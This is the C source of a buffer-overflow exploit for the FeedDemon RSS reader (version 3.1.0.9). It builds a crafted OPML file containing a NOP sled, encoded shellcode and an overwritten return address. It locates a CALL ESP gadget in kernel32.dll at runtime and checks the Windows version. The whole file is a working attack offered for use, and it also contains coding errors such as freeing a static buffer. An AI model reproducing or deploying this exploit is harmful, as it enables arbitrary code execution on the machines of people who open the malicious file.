/*Download latest vuln app :http://www.newsgator.com/Individuals/FeedDemon/Default.aspx
  This exploit identifies your OS and searches in memory for a RETCODE thus working 100%.*/
#include<stdio.h>
#include<string.h>
#include<getopt.h>
#include<windows.h>
void banner();
void exploit(char*);
 void print(char*);
 unsigned int getFsize(FILE*,char*);
 int cpy(char*,char*);
 void gen_random(char*,const int);
 DWORD FindRetToEspAddress(VOID);
 DWORD SearchStream(const char*,size_t,const char*,size_t);
DWORD GetNtosDelta (VOID);
DWORD GetOSVersion (VOID);
#define VULNF           "test.opml"
#define VER             "3.1.0.9"
#define POCNAME         "feedDemon opml file buffer overflow exploit"
#define AUTHOR          "fl0 fl0w"
#define IF(x,NULL)      if(x==NULL)
#define FOR(i,a,b)      for(i=a;i<b;++i)
#define NOPS            8006
#define FREE(x)         (free(x),x=NULL)
#define NUL             '\0'
#define START           {
#define END             }
#define MYSZ            size_t
#define ALLOC(i,k)      malloc((MYSZ)(i)*(MYSZ)(k))
#define WXP_DELTA 0xA67FF; // SP2 Fully patched!!
#define W2K_DELTA 0x0;
#define W2K3_DELTA 0x0;
#define WVISTA_DELTA 0x0;
#define EIPOFFSET       168
#define EIPNOPOFFS      8174       
   typedef unsigned char BYTE; //8 bits
 typedef unsigned short WORD; //2 bytes=16 bits
 typedef unsigned long DWORD; //4 bytes=32 bits
 typedef unsigned long long QWORD; //8 bytes=64bits
 DWORD  g_dwOsVersion        = 0;
LPVOID g_PatchAddress       = NULL;
 
 
typedef BOOL (WINAPI *PENUMDEVICES)(LPVOID*,
                                    DWORD ,
                                    LPDWORD);
 
typedef DWORD (WINAPI *PGETDEVNAME)(LPVOID ImageBase,
                                    char  *lpBaseName,
                                    DWORD nSize);
 
typedef DWORD (WINAPI* PQUERYSYSTEM)(UINT, PVOID, DWORD,PDWORD);
 typedef enum {
         Error = -1,
         True,
         False=0,
         success,
         }Boolean;
 enum OSes
{
    OS_WXP=1,
    OS_W2K,
    OS_W2K3,
    OS_VISTA
};
  char shellcode[]={
"\x31\xC9\x83\xE9\xDE\xD9\xEE\xD9\x74\x24\xF4\x5B\x81\x73\x13\xEC" // 204 bytes
"\x2D\x36\x5E\x83\xEB\xFC\xE2\xF4\x10\xC5\x72\x5E\xEC\x2D\xBD"
"\x1B\xD0\xA6\x4A\x5B\x94\x2C\xD9\xD5\xA3\x35\xBD\x1\xCC\x2C"
"\xDD\x17\x67\x19\xBD\x5F\x2\x1C\xF6\xC7\x40\xA9\xF6\x2A\xEB"
"\xEC\xFC\x53\xED\xEF\xDD\xAA\xD7\x79\x12\x5A\x99\xC8\xBD\x1"
"\xC8\x2C\xDD\x38\x67\x21\x7D\xD5\xB3\x31\x37\xB5\x67\x31\xBD"
"\x5F\x7\xA4\x6A\x7A\xE8\xEE\x7\x9E\x88\xA6\x76\x6E\x69\xED"
"\x4E\x52\x67\x6D\x3A\xD5\x9C\x31\x9B\xD5\x84\x25\xDD\x57\x67"
"\xAD\x86\x5E\xEC\x2D\xBD\x36\xD0\x72\x7\xA8\x8C\x7B\xBF\xA6"
"\x6F\xED\x4D\xE\x84\xDD\xBC\x5A\xB3\x45\xAE\xA0\x66\x23\x61"
"\xA1\xB\x4E\x57\x32\x8F\x2D\x36\x5E\x90\x90\x90\x90\x90\x90"
"\x90\x90"
"\x41\x41\x41\x41"        // "\xED\x1E\x94\x7C" -1 EIP offset 8368 from the beggining of the file or 168bytes from the start of shellcode buffer
"\x90\x90\x90\x90\x90\x90\x90\x90\x90"    //nopsleed                     
"\x90\x90\x90\x90\x90\x89\xE1\xFE\xCD\xFE\xCD\xFE\xCD\xFE\xCD"
"\xFE\xCD\xFE\xCD\x89\xCC\xFF\xE4"};
   char header[]=
 {
    0xFF, 0xFE, 0x3C, 0x00, 0x6F, 0x00, 0x70, 0x00, 0x6D, 0x00, 0x6C, 0x00, 0x20, 0x00, 0x76, 0x00,
    0x65, 0x00, 0x72, 0x00, 0x73, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x3D, 0x00, 0x22, 0x00,
    0x31, 0x00, 0x2E, 0x00, 0x31, 0x00, 0x22, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x62, 0x00, 0x6F, 0x00,
    0x64, 0x00, 0x79, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x6F, 0x00, 0x75, 0x00, 0x74, 0x00, 0x6C, 0x00,
    0x69, 0x00, 0x6E, 0x00, 0x65, 0x00, 0x20, 0x00, 0x74, 0x00, 0x65, 0x00, 0x78, 0x00, 0x74, 0x00, //83 bytes
    0x3D, 0x00, 0x22, 0x00 };
    char tail[]=
{
    0x22, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x6F, 0x00, 0x75, 0x00, 0x74, 0x00, 0x6C, 0x00, 0x69, 0x00,
    0x6E, 0x00, 0x65, 0x00, 0x20, 0x00, 0x74, 0x00, 0x65, 0x00, 0x78, 0x00, 0x74, 0x00, 0x3D, 0x00,
    0x22, 0x00, 0x42, 0x00, 0x4B, 0x00, 0x49, 0x00, 0x53, 0x00, 0x22, 0x00, 0x20, 0x00, 0x74, 0x00,
    0x69, 0x00, 0x74, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x3D, 0x00, 0x22, 0x00, 0x53, 0x00, 0x56, 0x00,
    0x52, 0x00, 0x54, 0x00, 0x22, 0x00, 0x20, 0x00, 0x74, 0x00, 0x79, 0x00, 0x70, 0x00, 0x65, 0x00,
    0x3D, 0x00, 0x22, 0x00, 0x72, 0x00, 0x73, 0x00, 0x73, 0x00, 0x22, 0x00, 0x20, 0x00, 0x78, 0x00,
    0x6D, 0x00, 0x6C, 0x00, 0x55, 0x00, 0x72, 0x00, 0x6C, 0x00, 0x3D, 0x00, 0x22, 0x00, 0x68, 0x00,
    0x74, 0x00, 0x74, 0x00, 0x70, 0x00, 0x3A, 0x00, 0x2F, 0x00, 0x2F, 0x00, 0x6D, 0x00, 0x69, 0x00,
    0x6C, 0x00, 0x77, 0x00, 0x30, 0x00, 0x72, 0x00, 0x6D, 0x00, 0x2E, 0x00, 0x63, 0x00, 0x6F, 0x00,
    0x6D, 0x00, 0x2F, 0x00, 0x72, 0x00, 0x73, 0x00, 0x73, 0x00, 0x2E, 0x00, 0x70, 0x00, 0x68, 0x00,
    0x70, 0x00, 0x22, 0x00, 0x2F, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x6F, 0x00, 0x75, 0x00,
    0x74, 0x00, 0x6C, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x65, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x2F, 0x00,
    0x62, 0x00, 0x6F, 0x00, 0x64, 0x00, 0x79, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x6F, 0x00,
    0x70, 0x00, 0x6D, 0x00, 0x6C, 0x00, 0x3E, 0x00,
} ;
 
  char buffer[10000000];
   char eip2[]="\x8B\xDC\x67\x02";
   char jmpreg[]="\x89\xCC\xFF\xE4";// offset 8290 bytes
  // char endp[]=;
   unsigned char nop=0x90;
   signed int c;
   int x;
   DWORD eip;
 int main(){
        //if(argc>2)
        //  while(c=getopt()!=EOF) ......
        //    else
        //   os(ret); 
        banner();
           exploit(VULNF);
           GetNtosDelta();
           printf("[!]Your Retcode is: 0x%X\n",eip);
          print("Done!");
          printf("File is : %d bytes",x);
        //  printf("%d",strlen(shellcode));
          getchar();
           return 0;
     }
    void exploit(char* fname){
         FILE* f=fopen(fname,"wb");
            if(f) {
               memset(buffer,0x90,NOPS);
                eip=FindRetToEspAddress();
                memcpy(shellcode+EIPOFFSET,&eip,4);
               fwrite(header,sizeof(char),84,f);
                fwrite(buffer,sizeof(char),NOPS,f);
                fwrite(shellcode,sizeof(char),204,f);
               fwrite(tail,sizeof(char),216,f);
                 fclose(f);
                   free(buffer);
                   }
                 else {print("error writing file");   exit(0);}
                   x=getFsize(f,VULNF);
         }
     void banner(){printf("[*]%s\n[*]Ver %s\n[*]Author %s\n",POCNAME,VER,AUTHOR); }   
void gen_random(char *s, const int len)
    { int i; //helps u find the offsets
      static const char alphanum[] ="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
      
      FOR(i,0,len)
      {
        s[i]=alphanum[rand()%(sizeof(alphanum)-1)];
      }
       s[len]=0;
      }
   unsigned int getFsize(FILE* g,char* gname)
    {
             unsigned int s;
             
             g=fopen(gname,"rb");
              
             IF(g,NULL)
             {
             print("File error at reading");
             exit(0);
             }           
             fseek(g,0,SEEK_END);
             s=ftell(g);
              
             return s;
    }
      int cpy(char* source,char* dest)
    {
        int len;
        len=strlen(source);
        memcpy(dest,&source,len+1);
        return len;
    }    
    void print(char* msg)
    {
       printf("[*]%s\n",msg);
    }  
    DWORD GetOSVersion (VOID)
 {
    OSVERSIONINFOA  osvi;
    DWORD retval = 0;
 
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
 
    if ( GetVersionExA(&osvi) )
    {
        if (osvi.dwMajorVersion == 5)
        {
            switch(osvi.dwMinorVersion)
            {
                case 0:
                    retval = OS_W2K;
                    break;
                case 1:
                    retval = OS_WXP;
                    break;
                case 2:
                    retval = OS_W2K3;
                    break;
            }
        }  
 
        else if (osvi.dwMajorVersion == 6)
        {
            retval = OS_VISTA;
        }
    }
 
    g_dwOsVersion = retval;
 
    return retval;
 }
 
  DWORD GetNtosDelta (VOID)
 {
    DWORD retval = 0;
 
    switch(GetOSVersion())
    {
        case OS_VISTA:
            print("System identified as Windows Vista\n");
            retval = WVISTA_DELTA;
            break;
        case OS_W2K:
            print("System identified as Windows 2000\n");
            retval = W2K_DELTA;
            break;
        case OS_W2K3:
            print("System identified as Windows 2003\n");
            retval = W2K3_DELTA;
            break;
        case OS_WXP:
            print("System identified as Windows XP\n");
            retval = WXP_DELTA;
            break;
        default:
            print("Unidentified system!\n");
    }
 
    return retval;
         
 }
   DWORD SearchStream(
    const char *pvStream,
    size_t uStreamSize,
    const char *pvSubStream,
    size_t uSubStreamSize
)
{
    unsigned int uCount = 0,i,j;
 
    while( (uStreamSize) > (uCount) ) {
        for(i=0;i<=(uSubStreamSize-1);i++) {
            if(*pvStream != pvSubStream[i]) {
                *pvStream++;
                if( i>0 ) {
                    for(j=0;j<i;j++)
                        *pvStream--;
                }
                break;
            }
            if( i == (uSubStreamSize-1) )
                return (uCount);
            *pvStream++;
        }
        uCount++;
    }
 
    return -1;
}
 
DWORD FindRetToEspAddress(VOID)
{
    HMODULE hModule = GetModuleHandle("kernel32.dll");
    DWORD dwEspRet;
    char* pszCallEsp = "\xFF\xD4"; // CALL ESP
    PIMAGE_DOS_HEADER pimage_dos_header;
    PIMAGE_NT_HEADERS pimage_nt_headers;
 
    pimage_dos_header = (PIMAGE_DOS_HEADER)hModule;
    pimage_nt_headers = (PIMAGE_NT_HEADERS)((DWORD)hModule+pimage_dos_header->e_lfanew);
 
    dwEspRet = SearchStream((char*)hModule,pimage_nt_headers->OptionalHeader.SizeOfImage,pszCallEsp,sizeof(WORD));
 
    return (dwEspRet += (DWORD)hModule);
}

